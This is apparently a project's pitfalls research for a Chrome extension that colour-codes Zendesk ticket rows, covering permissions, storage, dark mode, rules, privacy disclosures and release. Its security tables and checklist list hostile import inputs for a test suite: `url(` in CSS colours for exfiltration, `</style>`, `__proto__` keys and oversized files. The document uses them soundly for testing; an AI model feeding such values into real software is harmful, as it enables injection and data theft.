**Phase to address:** Rules phase (engine, truth table, performance). Recon for placeholder and hidden text belongs in the Foundation or Rules recon.

---

### Pitfall 9: A single "harmless" permission disables Zhroma for every existing user

**What goes wrong:**
Per the Permission Warnings page (2024-02-05), *"When a new permission that triggers a warning is added, the extension will be disabled until the user accepts the new permission."* The Update page (2020-12-03) says users are "prompted to accept them or disable the extension". The v1.1 features tempt exactly these permissions (Permissions list, 2026-09-09):
- `downloads` for export: warning "Manage your downloads."
- `clipboardWrite` for "copy rules": warning "Modify data you copy and paste."
- `tabs` to read the current view's URL or title from the options page: warning "Read your browsing history."
- `unlimitedStorage` shows no warning, but it is a permission change and extends review for nothing.

Staged rollout is only available above 10,000 seven-day active users (Update page), so a mistake reaches **every** install at once.

**How to avoid:**
- Export uses a `Blob` plus an `<a download>` on the options page. Import uses `<input type="file">` **on the options page**. The **popup closes when a file dialog opens** (a long-standing Chromium issue), so import must not be in the popup.
- Use `chrome.runtime.openOptionsPage()` (no permission) and `options_ui` with `open_in_tab: true`. The embedded options panel is too cramped for a rule editor, and the Tabs API is unavailable there.
- Keep the frozen contract assertion `permissions === ['storage']` and no `host_permissions`. It fails the build before any of this can ship.

**Phase to address:** All phases, with the contract test as the guard. Release phase re-checks the packaged manifest.

---

### Pitfall 10: A fully nested AND/OR builder that non-technical agents can't use

**What goes wrong:**
Arbitrary nesting ("(A AND (B OR C)) OR D") is where rule builders lose ordinary users:
- mis-grouped logic, AND and OR confused;
- rule order not understood, so "why isn't my rule winning?";
- colours picked by hex that later clash with the theme;
- rules typed against column names that don't exist.

Deep nesting in an import file is also a recursion depth or stack risk.

**How to avoid:**
- **Constrain the grammar to one level: a rule matches if *any* of its groups match, and a group matches if *all* its conditions match** (OR of ANDs). This expresses every boolean condition, shows naturally as "Match when … and … — or when … and …", and caps depth at 2 by construction.
- **Default new rules to a theme slot, not a hex,** so a theme switch re-colours them coherently. Show a live preview swatch on both the light and the dark background.
- **Explicit ordering with drag handles plus up/down buttons** (for keyboard use). Show "first matching wins" next to the list.
- **Column pickers suggest Zendesk's standard English column names** plus free text for custom fields. Show the per-rule "found in current view" status (Pitfall 8).
- **Readable summaries.** Each rule renders as one English sentence in the list.

**Phase to address:** Options/Rules UI phase. It is a good candidate for `/gsd-ui-phase` and a sketch before build.

---

## Moderate Pitfalls

| Pitfall | What goes wrong | Prevention | Phase |
|---|---|---|---|
| Listing names too many brands | The Spam FAQ (2020-05-01): *"When listing supported websites or brands in the description, do not list more than five."* Six named themes plus Zendesk is seven, a keyword-spam risk | Name at most four or five themes in the description. Show the rest in a screenshot | Release |
| Theme names and attribution | Presets borrow names and palettes from third-party projects (mostly MIT-licensed; some publish naming guidelines) | Credit each source in a `NOTICE` in the repo, use no logos, don't imply endorsement. **LOW confidence**: licence and naming terms not individually verified | Themes |
| Significant code change slows review | The Review Process page (2021-12-10) lists "significant code changes" as a closer-review trigger. The runtime roughly doubles | Keep vanilla, readable, unbundled code. Update `release/reviewer-instructions.md` with the options page steps. Expect days to weeks, and don't date the launch. A rejected update leaves 0.1.0 live and users are not notified | Release |
| No rollback | The store doesn't roll back. Every version must be higher than the last | Any 1.0.0 emergency fix ships as 1.0.1. 0.1.0 code ignores the new keys, so "revert to the 0.1.0 runtime as 1.0.1" is a valid, pre-tested escape hatch. Keep it tested | Release |
| Export leaks identity to colleagues | An agent shares an export. The recipient imports it and their "me" becomes the sender's name, so "assignee is me" highlights a colleague's tickets | **Export excludes identity by default,** and import never overwrites identity. The export UI says "This file contains the rules you typed, which may include names" | Options/Import |
| Old Chrome drops modern CSS | Using `light-dark()` (123), `color-mix()` (111) or relative colour syntax with `minimum_chrome_version: 106`: an invalid `!important` declaration is dropped and the tint disappears on older Chrome | Declare a fallback first, or raise `minimum_chrome_version` as a recorded decision. Users below it keep 0.1.0 | Themes |
| "Identical to 0.1.0" contradicts "readable in dark mode" | 0.1.0 paints light tints in dark mode. A fresh 1.0.0 install in dark mode *must* differ | Scope the requirement: identical **in the light interface with no rules**. Dark mode gets the new dark variant of the default theme | Requirements (now) |
| Popup invariant silently broken | The popup "never reads or writes storage itself" is verified. The theme picker changes that | Either route theme writes through the worker (new code, new tests) or give the popup ownership of the `theme` key alone. Record the invariant change. Keep the switch path untouched | Foundation/Themes |
| `onChanged` storms across tabs | Theme or rule saves reconcile every open Zendesk tab | Compare old and new values and skip no-op changes. Compile once; reconcile once per change | Foundation |

## Minor Pitfalls

| Pitfall | Prevention |
|---|---|
| Options page styled only for light mode | The options page and popup honour `color-scheme: light dark`. Preview swatches over both Zendesk backgrounds (`#FFFFFF` and `#151A1E`) |
| Export filename and format drift | `zhroma-settings-YYYY-MM-DD.json`, with `{ "format": "zhroma-settings", "schemaVersion": 1, ... }` |
| Prototype pollution on import | Validate the parsed JSON against an explicit schema, and rebuild objects from allowed keys only. Never `Object.assign` parsed input |
| Console logging of rule values or identity | Keep v1's rule: counts and enums only. Never log names or cell text |
| Theme picker shows presets the agent can't compare | Show swatches for both modes in the popup, not names only |

---

## Technical Debt Patterns

| Shortcut | Immediate Benefit | Long-term Cost | When Acceptable |
|----------|-------------------|----------------|-----------------|
| Route Priority through the new rule engine | One code path | Changes verified semantics; full re-verification; parity unprovable | **Never** for 1.0.0 |
| One `settings` blob in storage | Simple read and write | Lost updates across popup, options and import; breaks single-writer | Never |
| Seed defaults on install or update | "Explicit" state | Existing users pinned to stale defaults; stored data to disclose for non-opted-in users | Never |
| Persist auto-detected identity | Detect once | PII stored without a user action; disclosure and consent burden | Never; persist only typed or confirmed names |
| Arbitrary nested AND/OR | Maximum expressiveness | Unusable UI; recursion risk on import | Never in 1.0.0; OR-of-ANDs is equally expressive |
| Same alpha for light and dark | Half the palette data | Tints vanish in dark mode | Never |
| Edit contract tests until green | Fast | Deletes the frozen privacy and permission guards | Never; split frozen from v1-specific |
| Regex "contains" | Power users happy | ReDoS freezes Zendesk tabs | Not in 1.0.0 |
| Identity via Zendesk API or MAIN world | Reliable name | Network call; breaks privacy claims and the "no API" decision; review surface | Never |

## Integration Gotchas

| Integration | Common Mistake | Correct Approach |
|-------------|----------------|------------------|
| v1 MutationObserver (`attributeFilter: INTERPRETATION_ATTRIBUTES` on `document`, subtree) | Add `class` or `style` for dark-mode detection, or add new owned attributes without expected-marker tracking | Separate non-subtree observer on `html`/`body` for the theme; register each new owned attribute in the expected-marker map; test for no self-retrigger |
| v1 worker single-writer (`enabled`) | Fold `enabled` into new settings, or write it from options or import | Leave the key and its path byte-identical; import never writes `enabled` |
| v1 diagnosis enum (`working`/`missing`/`cannot-read`/`neutral`) | Keep showing "Add a Priority column" while rules tint rows | Specify rule-aware diagnosis copy in REQUIREMENTS; unchanged with zero rules |
| v1 English gate (`html[lang\|="en" i]` in CSS and JS) | Drop it for rules, or omit it from dynamically emitted CSS | Keep it in every emitted selector; record localisation as out of scope |
| `zhroma.css` `!important` background-color on `td` | Assume light-mode row-state acceptance holds in dark | New dark-mode row-state human check per preset |
| Chrome Web Store dashboard | Reuse 0.1.0 data categories and single-purpose text | Re-read live labels; update categories (likely PII), single purpose ("colour-code ticket rows in Zendesk views by priority and by the agent's own rules"), and the `storage` justification |
| GitHub Pages privacy policy | Update after 1.0.0 publishes | Update, verify the byte-match, *then* publish (deferred publishing) |
| Popup file input | Import button in the popup | Popup closes on file dialog; put import and export on the options page |
| `chrome.storage.onChanged` | Assume ordering or atomicity across keys and contexts | One writer per key; one `set` per import; compare old and new values |

## Performance Traps

| Trap | Symptoms | Prevention | When It Breaks |
|------|----------|------------|----------------|
| Rule engine runs with zero rules | Zero-rule median above 1.3 ms | Early exit when `rules.length === 0` | Immediately, for every user |
| `textContent` for every column of every row | Pass time grows with column count | Read only referenced column indexes | Wide views (15+ columns) × 30+ rows |
| Recompiling rules per pass | CPU on every mutation | Compile once per `onChanged` | Any rule count |
| Relative-date text ticks | Periodic reconciles | Already bounded by the v1 design. Make sure repeat passes are no-op writes, with no attribute churn | Always present; costs only if writes aren't skipped |
| Luminance or theme detection per row | Forced style recalculation | Once per pass, on a non-tinted element, cached | 50+ rows |
| Autosave storms | All tabs reconcile per keystroke | Explicit Save or debounce ≥ 500 ms | While editing rules with Zendesk open |
| Deep or unbounded imports | Options page freeze; stack overflow | Size, count and depth caps; OR-of-ANDs grammar | Hostile or accidental large file |

## Security Mistakes

| Mistake | Risk | Prevention |
|---------|------|------------|
| Unvalidated colour strings emitted as CSS | Zendesk UI broken; `url()` network requests; CSS exfiltration | Strict hex regex and enum slots; numeric builder; "no `url(`" test over all emitted CSS |
| `innerHTML` with imported rule text on the options page | Markup injection in a privileged page | `textContent` and DOM APIs only |
| Rules compiled to code strings | CSP violation; interpreter-policy drift | Closures over validated enums |
| Identity or header text in messages or logs | Page text crosses contexts undisclosed | In-content-script evaluation; finite-enum status; explicit on-demand exception recorded in disclosures |
| Import overwrites identity | Wrong "me" silently | Identity excluded from export and never imported |
| Permission creep for convenience (`downloads`, `clipboardWrite`, `tabs`) | Extension disabled for all users on update; enterprise `blocked_permissions` | Blob download, file input, `openOptionsPage`; frozen permission test |

## UX Pitfalls

| Pitfall | User Impact | Better Approach |
|---------|-------------|-----------------|
| Replace-rule hides Urgent | Agent misses an urgent ticket, which defeats the core value | Guard Urgent, or warn and offer "add a mark" |
| Rule silently inactive (column missing, header renamed, identity undetected) | "Rules don't work" | Per-rule live status via finite enum; plain-English reason |
| Theme chosen in light mode looks wrong in dark | Surprise at night | Swatch previews for both modes in the popup and options |
| Colourblind preset differs only by hue | Still unusable for the target users | Lightness-ordered, higher-alpha, validated under simulation; optional Urgent stripe |
| Options page reachable only from `chrome://extensions` | Feature undiscoverable | A "Rules & themes…" link in the popup via `openOptionsPage()` |
| Import replaces everything without warning | Lost work | Preview diff, confirm, one-step undo |

## "Looks Done But Isn't" Checklist

- [ ] **Zero change for 0.1.0 upgraders:** in the light interface with no rules, the parity test against pinned 0.1.0 blobs passes; storage holds only `enabled` until the agent changes something; no identity DOM read occurs.
- [ ] **Dark mode:** each preset checked on a live 200-row view in Dark, Light and Match-system modes; mid-session switch from the profile menu *and* by OS change (match-system); no wrong-variant flash on view entry.
- [ ] **Palette validator:** passes for every preset × mode, including deuteranopia and protanopia on blended colours for the colourblind preset; Urgent/High separation above the 0.1.0 baseline.
- [ ] **Row states in dark mode:** hover, hover-while-tinted, select one or all, focus, unread, on every preset.
- [ ] **Stripe mark:** no column shift (compare column x-positions before and after); checkbox cell unaffected.
- [ ] **Hostile import suite:** malformed JSON, wrong `format`, future `schemaVersion`, `__proto__` keys, a 10 MB file, 10,000 rules, deep nesting, `url(` in colours, `</style>` in values, HTML in rule names. Every case either rejects cleanly with nothing written, or applies wholly.
- [ ] **Race tests:** popup theme change during an options save; import while the popup toggles `enabled`; two options tabs open. No lost updates, and `enabled` never inverts.
- [ ] **Identity:** detection finds exactly one candidate, or nothing; override wins; export excludes it; no identity read without an "is me" rule; no network request (DevTools Network, filtered to the extension, empty across a session).
- [ ] **Performance:** zero-rule median ≈ 1.3 ms; stated worst-case rule set within budget; no forced reflow.
- [ ] **Manifest:** `permissions` still exactly `["storage"]`, no `host_permissions`, `world: ISOLATED`, `options_ui.open_in_tab: true`, version `1.0.0`.
- [ ] **Disclosures:** policy, listing, `disclosures.md` and dashboard all say the same thing; no "exactly one" left; policy published and byte-verified **before** item publication; deferred publishing used.
- [ ] **Listing:** at most five brands named in the description; dark-mode limitation line removed; new screenshots are real, sanitised, and show a rule and a dark view.
- [ ] **Reviewer instructions:** updated with options page steps and still credential-free.

## Recovery Strategies

| Pitfall | Recovery Cost | Recovery Steps |
|---------|---------------|----------------|
| 1.0.0 regresses priority tinting | MEDIUM (review latency) | Ship 1.0.1 = the 0.1.0 runtime with the version bumped; new keys are ignored; disclosures still true. Keep this build ready before publishing 1.0.0 |
| Policy out of date at publication | HIGH (delisting risk) | Update the policy immediately, re-verify the byte-match, update dashboard disclosures; if a notice arrives, respond through the dashboard |
| Permission with a warning shipped | HIGH (every user disabled until they accept) | Ship a fix removing it immediately; users must still re-enable. Prevention (frozen test) is the only real defence |
| Corrupt settings from a bad import | LOW if `previousSettings` exists | One-step undo; a "reset to defaults" button that deletes the new keys (absence = default) |
| Wrong "me" highlighted | LOW–MEDIUM | Override field; tighten detection to exactly one source; ship a fix |
| Dark variant wrong after a Zendesk front-end change | MEDIUM | Detection fails quiet to the light variant (0.1.0 behaviour); re-run the dark-mode recon; ship a code-only fix with an unchanged permission set |
| Hostile CSS value reached the page | HIGH | Emergency release with validation at emit; audit for `url(`; policy statement review |

## Pitfall-to-Phase Mapping

Phase names are suggestions. Map them onto whatever the v1.1 roadmap uses.

| Pitfall | Prevention Phase | Verification |
|---------|------------------|--------------|
| 2. Priority-path regression / evidence cost | **Foundation (first)** | Differential 0.1.0 parity test green; contract split into frozen and versioned parts; zero-rule perf median ≈ 1.3 ms |
| 3. Storage races, single-writer, schema | **Foundation** | Key-ownership table; no `onInstalled` writes; `schemaVersion` migrations tested; race tests pass |
| "Identical to 0.1.0" vs dark mode | **Requirements (before roadmap)** | REQUIREMENTS scopes parity to light mode with no rules |
| 5. Dark-mode detection | **Themes — starts with live recon** | Light, dark and match-system fixtures admitted; mid-session switch observed live; no `class` in the main filter |
| 4. Palette readability / colourblind collapse | **Themes** | Validator test for every preset × mode; dark row-state checklist passed |
| 6. CSS injection / exfiltration | **Themes** (emit builder) + **Options/Import** (hostile suite) | No-`url(` test over emitted CSS; hostile import suite green |
| 8. Rule semantics and performance | **Rules** | Truth-table tests; group-row skip; duplicate-header unresolvable; perf harness with worst-case rules |
| 10. Rule editor UX | **Options/Rules UI** (UI-SPEC and sketch) | OR-of-ANDs grammar; per-rule status; first-match explained |
| 7. Identity wrong or fragile | **Identity — starts with live recon** | Exactly-one-candidate detection; override wins; not in export; no read without an "is me" rule |
| 1. Disclosures, policy, consent | **Identity** (opt-in design) + **Release** | All four documents consistent; policy live before publish; deferred publish used; `policy-applicability.md` updated with dated findings |
| 9. Permission creep | **All** (frozen contract test) + **Release** | Packaged manifest `permissions === ["storage"]` |

**Ordering implications for the roadmap:**
1. **Foundation first:** parity harness, contract split, storage schema and key ownership. Every later phase changes shipped bytes. Without a cheap way to prove "0.1.0 behaviour unchanged", each phase reopens the whole v1 human check set.
2. **Themes before Rules.** Rules reference theme slots, and the CSS emit builder (with its validation) is shared infrastructure.
3. **Identity after Rules.** "Is me" is one operator on the rule engine, and its opt-in gating depends on rules existing.
4. **Release is a real phase, not a footnote:** the four documents, dashboard categories, deferred publishing, a ready 1.0.1 rollback build, and reviewer instructions.

**Research flags:**
- **Themes phase:** needs live recon (how Zendesk marks dark mode, whether it sets `color-scheme`, what mutates on a switch). This cannot be answered from documentation.
- **Identity phase:** needs live recon (where the name renders, lazy or not, format compared with the Assignee cell).
- **Rules phase:** light recon (placeholder text for empty cells, hidden accessibility text, date-column rendering).
- **Release phase:** live dashboard reading (exact data-category labels). The consent question stays open, and the answer has to come from Google, not from more reading.
- **Foundation and Options UI:** standard patterns; no external research needed.

## Sources

**Chrome — official (developer.chrome.com), fetched 2026-09-25; seam tier LOW (single fetch), quoted verbatim:**
- Program Policies (last updated 2025-05-22): accurate and up-to-date privacy policy; "If an extension introduces different user data practices after installation, the extension must prominently disclose data practice changes"; narrowest permissions; single purpose.
- Disclosure Requirements (2022-11-01): pre-install disclosure and consent; post-install data-practice changes.
- User Data FAQ (page footer 2016-04-23): Q4 PII includes a person's name and username; Q3 and Q14 local-only still needs disclosure and a policy; Q10 disclosure in the product UI, with a specific agreeing action.
- Permission Warnings (2024-02-05): an extension is disabled on update until a new warning-bearing permission is accepted.
- Permissions list (2026-09-09): `storage`, `unlimitedStorage` no warning; `downloads` "Manage your downloads."; `tabs` "Read your browsing history."; `clipboardWrite` "Modify data you copy and paste."
- Update your item (2020-12-03): version must increase; dashboard info must be updated when listing or privacy details change; staged rollout only above 10k seven-day active users; deferred publishing up to 30 days.
- Review process (2021-12-10): "significant code changes" and new developers trigger closer review; a rejected update leaves the listing and published CRX unchanged; users not notified.
- chrome.storage reference (2026-09-11): `storage.local` 10,485,760 bytes (5 MB in Chrome ≤113); exposed to content scripts by default; cleared on uninstall; no atomicity statement.
- MV3 requirements (2024-04-03): interpreter-of-remote-data prohibition.
- Spam FAQ (2020-05-01): list no more than five supported websites or brands in the description.
- Options page guide (2012-09-18): `options_ui.open_in_tab`; embedded options can't use the Tabs API; `runtime.openOptionsPage()`.

**Zendesk (seam tier LOW):**
- [Using dark mode to increase agent display options](https://support.zendesk.com/hc/en-us/articles/9011095783322-Using-dark-mode-to-increase-agent-display-options): Dark, Light and Match-system; per-conversation "View in dark/light"; admin activation; Support only.
- [Announcing dark mode for Zendesk Support](https://support.zendesk.com/hc/en-us/articles/9235318127770-Announcing-dark-mode-for-Zendesk-Support); [Activating and deactivating dark mode](https://support.zendesk.com/hc/en-us/articles/9235063674138-Activating-and-deactivating-dark-mode-for-your-account).
- [Internal Note — Zendesk Dark Mode](https://internalnote.com/zendesk-dark-mode/) (2025-03-24): dark background `#151A1E`, text `#D8DCDE`, Garden `ThemeProvider`. Third-party.
- [Zendesk Developer Docs — Supporting dark mode (apps)](https://developer.zendesk.com/documentation/apps/app-developer-guide/dark-mode/) and [Garden theme object](https://garden.zendesk.com/components/theme-object/): `colors.base` light/dark; apps get `colorScheme` via ZAF, which is not available to a content script.
- Community report (via search summary): Match-system with OS "auto" stays dark. LOW.

**Chromium:** [Issue 40114753 / 104222 — file input in an extension popup](https://issues.chromium.org/issues/40114753): the popup closes when a file dialog opens; use an options page or tab.

**Local computation (this research):** Node script. Blended each palette's hues at the stated alpha over `#FFFFFF` (light) and `#151A1E` (dark). Computed WCAG contrast against assumed text colours `#2F3941` (light; Garden grey-800, an *assumption*) and `#D8DCDE` (dark). Computed pairwise OKLab distance ×100 and deuteranopia and protanopia simulation (Machado 2009, severity 1.0). Numbers are relative guidance for the validator design, not acceptance evidence. Preset hues used: Solarized `#dc322f/#cb4b16/#b58900/#859900`, Dracula `#ff5555/#ffb86c/#f1fa8c/#50fa7b`, Nord `#bf616a/#d08770/#ebcb8b/#a3be8c`, Okabe-Ito `#d55e00/#e69f00/#f0e442/#0072b2`.

**Repository evidence:** `extension/zhroma.css` (`background-color … !important` on `td`, English gate); `extension/content.js` (observer options, `INTERPRETATION_ATTRIBUTES`, expected markers, exact 'Priority' header); `extension/background.js` (single-writer queue); `test/extension/runtime-contract.test.js` (pinned manifest, banned CSS tokens); `release/privacy/index.html` (the "updated before the change ships" promise); `release/listing.md`, `release/disclosures.md`, `release/policy-applicability.md`, `release/PUBLISHING-STATUS.md` (automatic publication was enabled for 0.1.0); `.planning/phases/03-*/03-VERIFICATION.md` and `04-*/04-VERIFICATION.md` (1.3–1.4 ms medians).

---
*Pitfalls research for: adding themes, dark mode, custom rules, identity and options/import to a published storage-only MV3 extension reading Zendesk's DOM*
*Researched: 2026-09-25*
